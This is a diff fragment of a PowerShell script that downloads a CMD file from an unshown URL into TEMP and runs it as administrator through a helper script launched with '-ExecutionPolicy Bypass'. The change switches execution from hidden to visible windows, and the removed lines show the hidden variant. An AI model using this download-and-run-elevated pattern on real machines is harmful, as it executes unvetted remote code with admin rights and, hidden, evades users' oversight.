@@ -10,9 +10,9 @@ $tempPath = "$env:TEMP\ION.cmd"
 # Download the CMD file
 Invoke-WebRequest -Uri $cmdUrl -OutFile $tempPath
 
-# Create a PowerShell script to run the CMD file as administrator in hidden mode
+# Create a PowerShell script to run the CMD file as administrator in visible mode
 $scriptContent = @"
-Start-Process -FilePath 'cmd.exe' -ArgumentList '/c `"start /b $tempPath`"' -Verb RunAs -WindowStyle Hidden
+Start-Process -FilePath 'cmd.exe' -ArgumentList '/c `"start $tempPath`"' -Verb RunAs
 "@
 
 # Define the path for the temporary PowerShell script
@@ -21,5 +21,5 @@ $psScriptPath = "$env:TEMP\RunAsAdmin.ps1"
 # Write the script content to the temporary file
 $scriptContent | Out-File -FilePath $psScriptPath -Encoding ASCII
 
-# Execute the PowerShell script to run the CMD file as administrator in hidden mode
-Start-Process -FilePath 'powershell.exe' -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$psScriptPath`"" -WindowStyle Hidden
+# Execute the PowerShell script to run the CMD file as administrator in visible mode
+Start-Process -FilePath 'powershell.exe' -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$psScriptPath`"" -WindowStyle Normal
